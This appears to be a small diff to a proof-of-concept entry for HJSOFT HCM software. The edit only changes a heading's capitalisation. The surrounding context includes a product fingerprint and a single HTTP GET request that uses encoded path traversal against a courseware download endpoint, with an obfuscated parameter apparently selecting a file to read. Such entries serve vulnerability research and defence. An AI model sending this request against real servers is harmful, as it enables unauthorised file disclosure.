@@ -8,7 +8,7 @@
 app="HJSOFT-HCM"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
